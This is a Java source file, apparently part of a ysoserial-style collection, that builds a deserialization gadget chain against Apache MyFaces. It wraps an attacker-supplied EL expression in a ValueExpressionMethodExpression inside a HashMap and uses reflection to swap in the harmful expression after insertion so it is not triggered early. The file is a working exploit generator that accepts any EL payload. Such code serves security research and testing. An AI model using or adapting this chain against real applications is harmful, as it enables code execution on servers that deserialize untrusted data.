package org.su18.serialize.ysoserial.Myfaces.Myfaces1;

import org.apache.myfaces.context.servlet.FacesContextImpl;
import org.apache.myfaces.context.servlet.FacesContextImplBase;
import org.apache.myfaces.el.CompositeELResolver;
import org.apache.myfaces.el.unified.FacesELContext;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;
import org.su18.serialize.utils.SerializeUtil;

import javax.el.ELContext;
import javax.el.ExpressionFactory;
import javax.el.ValueExpression;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @author su18
 */
public class Myfaces1 {

	public static String payload = "${1+1}";

	public static Object generatePayload(String payloads) throws Exception {

		// 初始化 FacesContext 及 ELContext
		FacesContextImpl fc        = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
		ELContext        elContext = new FacesELContext(new CompositeELResolver(), fc);

		// 使用反射将 elContext 写入 FacesContextImpl 中
		Field field = FacesContextImplBase.class.getDeclaredField("_elContext");
		field.setAccessible(true);
		field.set(fc, elContext);

		// 使用 ExpressionFactory 创建 ValueExpression
		ExpressionFactory expressionFactory = ExpressionFactory.newInstance();
		// 有害的 ValueExpression
		ValueExpression valueExpression = expressionFactory.createValueExpression(elContext, payloads, Object.class);
		// 无害的 ValueExpression
		ValueExpression harmlessExpression = expressionFactory.createValueExpression(elContext, "${true}", Object.class);

		// 使用 ValueExpression 初始化 ValueExpressionMethodExpression
		ValueExpressionMethodExpression expression = new ValueExpressionMethodExpression(harmlessExpression);

		HashMap<Object, Object> map = new HashMap<>();
		map.put(expression, "su18");
		map.put("su19", "su20");

		// 先放入带有无害的 ValueExpression，put 到 map 之后再反射写入 valueExpression 字段避免触发
		Field field1 = expression.getClass().getDeclaredField("valueExpression");
		field1.setAccessible(true);
		field1.set(expression, valueExpression);

		return map;
	}


	public static void main(String[] args) throws Exception {
		SerializeUtil.writeObjectToFile(generatePayload(payload));
		SerializeUtil.readFileObject();
	}

}
